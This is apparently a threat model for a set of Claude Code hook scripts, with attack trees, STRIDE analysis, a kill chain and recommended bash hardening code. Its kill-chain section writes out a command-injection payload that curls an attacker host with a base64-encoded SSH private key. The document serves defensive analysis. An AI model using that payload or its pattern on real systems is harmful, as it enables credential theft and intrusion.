# Threat Model - Claude Code Hooks v2.45.1

## Attack Surface Diagram

```
┌──────────────────────────────────────────────────────────────────┐
│                    CLAUDE CODE (Entry Point)                      │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  User Input → JSON → Hook stdin                          │   │
│  │  - tool_name: "Write"                                     │   │
│  │  - file_path: ".claude/orchestrator-analysis.md"          │   │
│  │  - content: [markdown with task descriptions]            │   │
│  └──────────────────┬───────────────────────────────────────┘   │
└────────────────────┼────────────────────────────────────────────┘
                     │
                     ▼
    ┌────────────────────────────────────────────────┐
    │        HOOK EXECUTION ENVIRONMENT              │
    │  User Privileges • No Sandbox • Full FS Access │
    └────────────────┬───────────────────────────────┘
                     │
         ┌───────────┴────────────┐
         │                        │
    ┌────▼─────┐          ┌───────▼──────┐
    │  Bash    │          │   Python     │
    │  Hooks   │          │   Hooks      │
    │  (5)     │          │   (1)        │
    └────┬─────┘          └───────┬──────┘
         │                        │
         ▼                        ▼
┌─────────────────────┐  ┌──────────────────┐
│  ATTACK VECTORS     │  │  SECURITY        │
│                     │  │  CONTROLS        │
│ ① Command Injection │  │ ✓ umask 077      │
│ ② Path Traversal    │  │ ✓ mktemp         │
│ ③ Race Conditions   │  │ ✓ Fail-closed    │
│ ④ JSON Injection    │  │ ✗ Input valid.   │
│ ⑤ ReDoS             │  │ ✗ Path valid.    │
│                     │  │ ✗ File locking   │
└─────────────────────┘  └──────────────────┘
```

## Threat Actor Profiles

### TA-01: Malicious Extension Developer
**Motivation:** Data theft, backdoor installation  
**Capabilities:**
- Can write to `.claude/` directory
- Can inject malicious markdown in `orchestrator-analysis.md`
- Can control hook stdin JSON

**Attack Path:**
```
Extension → Write malicious .md → VULN-001 (Command Injection) → RCE
```

**Affected Assets:**
- SSH keys (`~/.ssh/id_rsa`)
- AWS credentials (`~/.aws/credentials`)
- Session ledgers (`~/.ralph/ledgers/`)
- Source code (entire workspace)

**Exploited Vulnerabilities:** VULN-001, VULN-002, VULN-006

---

### TA-02: Compromised User Environment
**Motivation:** Privilege escalation, persistence  
**Capabilities:**
- Can set environment variables (`CLAUDE_PROJECT_DIR`)
- Can create symlinks in workspace
- Can trigger TOCTOU races

**Attack Path:**
```
Env Manipulation → VULN-008 (Path Traversal) → Read /etc/passwd
Symlink Creation → VULN-003 (TOCTOU) → Overwrite critical files
```

**Affected Assets:**
- System configuration (`/etc/passwd`, `/etc/hosts`)
- User home directory
- Git repository integrity

**Exploited Vulnerabilities:** VULN-003, VULN-007, VULN-008

---

### TA-03: Insider Threat (Malicious Developer)
**Motivation:** Code injection, supply chain attack  
**Capabilities:**
- Full repository write access
- Can modify hook scripts
- Can inject malicious skills

**Attack Path:**
```
Commit malicious skill → VULN-010 (Path Traversal) → Read arbitrary files
Inject Python code → VULN-011 (Code Injection) → Execute arbitrary commands
```

**Affected Assets:**
- Skill validation system (`~/.ralph/skills/`)
- Python interpreter (code execution)
- File system (read/write access)

**Exploited Vulnerabilities:** VULN-010, VULN-011

---

## Attack Tree

```
┌─────────────────────────────────────────────────────────┐
│          GOAL: Compromise Claude Code Hooks             │
└────────────────────┬────────────────────────────────────┘
                     │
         ┌───────────┴────────────┬──────────────────┐
         │                        │                  │
    ┌────▼─────┐          ┌───────▼──────┐   ┌──────▼─────┐
    │ Data     │          │ Code         │   │ System     │
    │ Theft    │          │ Execution    │   │ Compromise │
    └────┬─────┘          └───────┬──────┘   └──────┬─────┘
         │                        │                  │
         │                        │                  │
    ┌────▼─────────────────┐     │           ┌──────▼────────┐
    │ Read Sensitive Files │     │           │ DoS / Crash   │
    └────┬─────────────────┘     │           └──────┬────────┘
         │                        │                  │
    ┌────▼──────────┐      ┌─────▼─────────┐  ┌─────▼────────┐
    │ VULN-002      │      │ VULN-001      │  │ VULN-012     │
    │ Path Trav.    │      │ Cmd Injection │  │ ReDoS        │
    │ (auto-plan)   │      │ (auto-plan)   │  │ (git-safety) │
    └────┬──────────┘      └─────┬─────────┘  └──────────────┘
         │                        │
    ┌────▼──────────┐      ┌─────▼─────────┐
    │ VULN-008      │      │ VULN-006      │
    │ Path Trav.    │      │ jq Injection  │
    │ (stop-verif.) │      │ (lsa-pre-step)│
    └────┬──────────┘      └─────┬─────────┘
         │                        │
    ┌────▼──────────┐      ┌─────▼─────────┐
    │ VULN-010      │      │ VULN-004      │
    │ Path Trav.    │      │ Cmd Injection │
    │ (skill-val.)  │      │ (context-warn)│
    └───────────────┘      └───────────────┘
```

**Critical Paths:**
1. **RCE via VULN-001:** Malicious extension → Write evil .md → Hook executes → Exfiltrate SSH keys
2. **File Read via VULN-002:** Crafted file_path → Path traversal → Read ~/.aws/credentials
3. **TOCTOU Attack via VULN-003:** Parallel execution → Symlink swap → Overwrite /etc/passwd

**Risk Score (per path):**
| Path | Likelihood | Impact | Risk |
|------|------------|--------|------|
| RCE (VULN-001) | MEDIUM | CRITICAL | **HIGH** |
| File Read (VULN-002) | HIGH | HIGH | **HIGH** |
| TOCTOU (VULN-003) | LOW | HIGH | **MEDIUM** |

---

## Data Flow Diagrams

### Auto-Plan-State Hook Flow

```
┌──────────────┐
│  Claude Code │
└───────┬──────┘
        │ JSON stdin
        ▼
┌────────────────────┐
│  auto-plan-state   │───────┐
│  .sh Hook          │       │
└────────┬───────────┘       │
         │                   │
         ▼                   │
┌──────────────────┐         │
│ Parse JSON       │         │ VULN-005
│ Extract:         │         │ JSON Injection
│ - file_path      │◄────────┘
│ - tool_name      │
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ Validate Path?   │──NO──► VULN-002 (Path Traversal)
└────────┬─────────┘
         │ YES (weak)
         ▼
┌──────────────────┐
│ Read .md file    │
│ Extract:         │
│ - task           │
│ - complexity     │──────► VULN-001 (Command Injection)
│ - model          │        via unquoted grep/sed
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ Create temp file │
│ Write JSON       │
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ Atomic mv to     │──────► VULN-003 (TOCTOU Race)
│ plan-state.json  │        Symlink swap window
└──────────────────┘
```

### LSA Pre-Step Hook Flow

```
┌──────────────┐
│  Claude Code │
└───────┬──────┘
        │ JSON stdin
        ▼
┌────────────────────┐
│  lsa-pre-step.sh   │
│  Hook              │
└────────┬───────────┘
         │
         ▼
┌──────────────────┐
│ Check plan-state │──────► VULN-007 (TOCTOU)
│ exists?          │        File check race
└────────┬─────────┘
         │ YES
         ▼
┌──────────────────┐
│ Extract step ID  │
│ with jq          │
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ Query .spec      │──────► VULN-006 (jq Injection)
│ with step ID     │        Unquoted variable
│ jq ".id==$step"  │        in jq query
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ Update plan-state│
│ with lsa_verify  │
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ Atomic write     │──────► VULN-007 (TOCTOU)
│ via mktemp + mv  │        Symlink replacement
└──────────────────┘
```

---

## Trust Boundaries

```
┌─────────────────────────────────────────────────────────┐
│                    TRUSTED ZONE                          │
│  ┌──────────────────────────────────────────────────┐   │
│  │  Claude Code Core                                 │   │
│  │  • Official binary                                │   │
│  │  • Signed code                                    │   │
│  │  • Memory-safe (assumed)                          │   │
│  └──────────────────┬───────────────────────────────┘   │
└────────────────────┼────────────────────────────────────┘
                     │ Trust Boundary #1
                     │ (Hook Invocation)
┌────────────────────▼────────────────────────────────────┐
│                 SEMI-TRUSTED ZONE                        │
│  ┌──────────────────────────────────────────────────┐   │
│  │  Hook Scripts (User-Writable)                     │   │
│  │  • ~/.claude/hooks/*.sh                           │   │
│  │  • Can be modified by user                        │   │
│  │  • Execute with user privileges                   │   │
│  └──────────────────┬───────────────────────────────┘   │
└────────────────────┼────────────────────────────────────┘
                     │ Trust Boundary #2
                     │ (File System Access)
┌────────────────────▼────────────────────────────────────┐
│                 UNTRUSTED ZONE                           │
│  ┌──────────────────────────────────────────────────┐   │
│  │  User Data / Workspace                            │   │
│  │  • .claude/orchestrator-analysis.md               │   │
│  │  • .claude/plan-state.json                        │   │
│  │  • Environment variables (CLAUDE_PROJECT_DIR)     │   │
│  │  • Symlinks, temp files                           │   │
│  └───────────────────────────────────────────────────┘   │
└──────────────────────────────────────────────────────────┘

CRITICAL INSIGHT: Hooks treat "UNTRUSTED ZONE" data as trusted!
```

**Current Issues:**
1. **TB#1 Violation:** Hook stdin (JSON from Claude Code) assumed safe → VULN-005
2. **TB#2 Violation:** File paths from workspace used without validation → VULN-002, VULN-008, VULN-010

**Required Controls:**
- Input validation at TB#1 (JSON schema, size limits)
- Path canonicalization at TB#2 (realpath, symlink detection)
- Content sanitization (whitelist alphanumeric in extracted values)

---

## STRIDE Threat Analysis

| Threat | Affected Hooks | Vulnerability | Mitigation Status |
|--------|---------------|---------------|-------------------|
| **Spoofing** | lsa-pre-step.sh | VULN-006 (jq injection) | ❌ None |
| **Tampering** | auto-plan-state.sh | VULN-003 (TOCTOU) | ⚠️ Partial (mktemp) |
| **Repudiation** | All | VULN-013 (verbose logs) | ⚠️ Partial (logs exist) |
| **Info Disclosure** | All path traversal | VULN-002, 008, 010 | ❌ None |
| **Denial of Service** | git-safety-guard.py | VULN-012 (ReDoS) | ⚠️ Low risk |
| **Elevation of Privilege** | auto-plan-state.sh | VULN-001 (cmd injection) | ❌ None |

**Legend:**
- ✅ Fully Mitigated
- ⚠️ Partially Mitigated
- ❌ No Mitigation

---

## Kill Chain Analysis

### Attack Scenario: SSH Key Exfiltration

**Stage 1: Reconnaissance**
- Attacker identifies Claude Code hooks in `~/.claude/hooks/`
- Discovers `auto-plan-state.sh` processes markdown files
- Identifies VULN-001 (command injection via unquoted grep/sed)

**Stage 2: Weaponization**
- Creates malicious VSCode extension that writes to `.claude/`
- Crafts payload: `# Task: Deploy$(curl http://attacker.com/x?k=$(base64 ~/.ssh/id_rsa))`

**Stage 3: Delivery**
- User installs malicious extension from marketplace
- Extension triggers on "orchestrator" command

**Stage 4: Exploitation**
- Extension writes malicious markdown to `.claude/orchestrator-analysis.md`
- Triggers `PostToolUse:Write` hook
- `auto-plan-state.sh` executes
- Line 80: `task=$(grep -E "^Task:" "$ANALYSIS_FILE" | ...)`
- Command substitution executes: `curl http://attacker.com/x?k=$(base64 ~/.ssh/id_rsa)`

**Stage 5: Installation**
- Attacker receives base64-encoded SSH private key
- Decodes key, installs on attack server
- Establishes persistent SSH access to victim's GitHub/servers

**Stage 6: Command & Control**
- Attacker uses stolen SSH key to:
  - Clone private repositories
  - Commit malicious code
  - Access production servers

**Stage 7: Actions on Objectives**
- Data exfiltration (source code, credentials)
- Supply chain attack (inject backdoors in commits)
- Lateral movement (use victim's SSH keys to access other systems)

**Mitigation Effectiveness:**
| Defense Layer | Current Status | Required |
|---------------|----------------|----------|
| Input validation | ❌ Missing | Quote variables, sanitize |
| Least privilege | ⚠️ Runs as user | Cannot improve (hooks need user access) |
| Network segmentation | N/A | Firewall egress filtering |
| Monitoring | ⚠️ Logs exist | SIEM alerts on curl/wget |

---

## Defense-in-Depth Strategy

```
┌──────────────────────────────────────────────────────────┐
│  Layer 1: INPUT VALIDATION (MISSING)                     │
│  ┌────────────────────────────────────────────────────┐  │
│  │ • JSON schema validation                           │  │
│  │ • Path canonicalization                            │  │
│  │ • Content sanitization (alphanumeric whitelist)    │  │
│  │ Status: ❌ NOT IMPLEMENTED                         │  │
│  └────────────────────────────────────────────────────┘  │
└───────────────────────┬──────────────────────────────────┘
                        │
┌───────────────────────▼──────────────────────────────────┐
│  Layer 2: SECURE CODING (PARTIAL)                        │
│  ┌────────────────────────────────────────────────────┐  │
│  │ • Variable quoting                                 │  │
│  │ • jq --arg usage                                   │  │
│  │ • Atomic operations (mktemp)                       │  │
│  │ Status: ⚠️ PARTIAL (missing quotes, validation)   │  │
│  └────────────────────────────────────────────────────┘  │
└───────────────────────┬──────────────────────────────────┘
                        │
┌───────────────────────▼──────────────────────────────────┐
│  Layer 3: FILE SYSTEM CONTROLS (PARTIAL)                 │
│  ┌────────────────────────────────────────────────────┐  │
│  │ • umask 077 (restrictive perms)                    │  │
│  │ • Symlink detection                                │  │
│  │ • File locking (flock)                             │  │
│  │ Status: ⚠️ PARTIAL (umask ✓, flock ✗, symlink ✗) │  │
│  └────────────────────────────────────────────────────┘  │
└───────────────────────┬──────────────────────────────────┘
                        │
┌───────────────────────▼──────────────────────────────────┐
│  Layer 4: MONITORING & LOGGING (WEAK)                    │
│  ┌────────────────────────────────────────────────────┐  │
│  │ • Comprehensive logging                            │  │
│  │ • Security event alerting                          │  │
│  │ • Anomaly detection                                │  │
│  │ Status: ⚠️ WEAK (logs exist, no alerts/redaction) │  │
│  └────────────────────────────────────────────────────┘  │
└───────────────────────┬──────────────────────────────────┘
                        │
┌───────────────────────▼──────────────────────────────────┐
│  Layer 5: INCIDENT RESPONSE (MISSING)                    │
│  ┌────────────────────────────────────────────────────┐  │
│  │ • Automated rollback                               │  │
│  │ • Forensic artifact collection                     │  │
│  │ • Quarantine procedures                            │  │
│  │ Status: ❌ NOT IMPLEMENTED                         │  │
│  └────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────┘
```

**Current Defense Score:** 2.5/5 layers effective

---

## Recommended Security Controls

### Immediate (Phase 1 - 2 Days)
1. **Input Sanitization Library**
   ```bash
   # Create ~/.claude/lib/security.sh
   sanitize_string() {
       local input="$1"
       local max_len="${2:-200}"
       # Whitelist: alphanumeric, space, dash, underscore, period
       [[ "$input" =~ ^[a-zA-Z0-9\ \-\_\.]{1,$max_len}$ ]] || return 1
       echo "$input"
   }
   
   validate_path() {
       local path="$1"
       local base="$2"
       # Canonicalize
       local canonical=$(realpath -m "$path")
       local expected=$(realpath -m "$base")
       # Validate
       [[ "$canonical" == "$expected" ]] || return 1
       # Reject symlinks
       [[ -L "$path" ]] && return 1
       echo "$canonical"
   }
   ```

2. **Quote All Variables**
   - Run: `shellcheck -S error ~/.claude/hooks/*.sh`
   - Fix: Add quotes around all `$var` → `"$var"`

3. **Use jq --arg Pattern**
   - Replace: `jq ".id == \"$var\""` → `jq --arg v "$var" '.id == $v'`

### Short-Term (Phase 2 - 1 Week)
4. **File Locking Implementation**
   ```bash
   acquire_lock() {
       local lock_file="$1"
       exec 200>"$lock_file"
       flock -x 200 || return 1
   }
   ```

5. **JSON Response Library**
   ```bash
   return_json() {
       jq -n --argjson cont "$1" --arg msg "$2" \
           '{continue: $cont, message: $msg}'
   }
   ```

6. **Security Monitoring**
   - Add audit log for hook executions
   - Alert on suspicious patterns (curl, wget, base64)

### Long-Term (Phase 3 - 1 Month)
7. **Automated Security Scanning**
   - CI/CD integration (ShellCheck, Bandit, Semgrep)
   - Pre-commit hooks for security validation

8. **Security Hardening Guide**
   - Developer training on secure shell scripting
   - Code review checklist
   - Penetration testing program

---

**Threat Model Version:** 1.0  
**Last Updated:** 2026-01-17  
**Next Review:** 2026-02-17 (30 days)  
**Related Docs:** `security-audit-v2.45.1.md`, `SECURITY-SUMMARY.md`
